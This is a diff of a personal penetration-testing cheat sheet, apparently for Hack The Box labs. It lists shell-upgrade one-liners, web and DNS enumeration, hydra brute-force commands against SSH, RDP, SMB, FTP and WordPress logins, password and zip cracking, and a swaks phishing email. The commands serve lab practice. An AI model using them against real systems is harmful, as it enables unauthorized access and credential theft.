@@ -1,5 +1,61 @@
-Upgrade Shell:
+#Upgrade Shell:
+python -c 'import pty; pty.spawn("/bin/sh")'
+echo 'os.system('/bin/bash')'
+/bin/sh -i
+/bin/bash -i
+perl -e 'exec "/bin/sh";'
+:!bash
 
-python -c'import pty; pty.spawn("/bin/bash")'
 Then use:
 stty -a
+
+#Find URL object using DIRB:
+dirb http://DOMAINHERE
+
+#Find Subdomains (dns -d flag) and directories (dir -u flag):
+gobuster dns -d **domainhere** -w **filelocation** -vv -o output.txt
+gobuster dir -u **domainhere** -w **filelocation** -vv -o output.txt
+
+#Wfuzz:
+wfuzz -c -w /home/czar/Downloads/HTB/tools/SecLists/Discovery/Web-Content/common.txt --hc 404,403 -u "**domainhere**"
+
+#hydra:
+export ip 10.10.10.1
+hydra -P password-file.txt -v $ip snmp	Hydra brute force against SNMP
+hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp //Hydra FTP known user and rockyou password list
+hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh	//Hydra SSH using list of users and passwords
+hydra -v -V -u -L users.txt -p "" -t 1 -u $ip ssh	//Hydra SSH using a known password and a username list
+hydra $ip -s 22 ssh -l -P big_wordlist.txt	H//ydra SSH Against Known username on port 22
+hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V	//Hydra POP3 Brute Force
+hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V	//Hydra SMTP Brute Force
+hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin	//Hydra attack http get 401 login with a dictionary
+hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip	//Hydra attack Windows Remote Desktop with rockyou
+hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb	//Hydra brute force SMB user with rockyou:
+hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'	//Hydra brute force a Wordpress admin login
+hydra -L usernames.txt -P passwords.txt $ip smb -V -f	//SMB Brute Forcing
+hydra -L users.txt -P passwords.txt $ip ldap2 -V -f	//LDAP Brute Forcing
+
+#nmap useful scans:
+nmap -sT -vv -A -O  openkeys.htb -p- -oN full_nmap.txt //scan all 65k ports 
+nmap 10.211.55.6 -sU –top-ports 250 //UDP 250 port scan
+nmap -vvv -A 10.10.10.199 //All flags scan
+nmap 10.211.55.6 -sC //nmap Default scripts
+
+#John - crack passwords:
+john **file** -w=/home/czar/Downloads/HTB/tools/rockyou.txt -show
+
+#swaks (phishing)
+swaks --to paulbyrd@sneakymailer.htb --from it@sneakymailer.htb --header "Subject: Credentials / Errors" --body "test test test" --server 10.10.10.197
+
+#crack zip file:
+fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' "file.zip"
+
+#Crack openssl encrypted files:
+#!bin/bash
+for password in $(cat /usr/share/wordlists/rockyou.txt)
+do 
+openssl enc -d -aes-256-cbc -a -in file.txt.enc -k $password -out $password-drupal.txt
+done
+then-->
+ls -lS
+
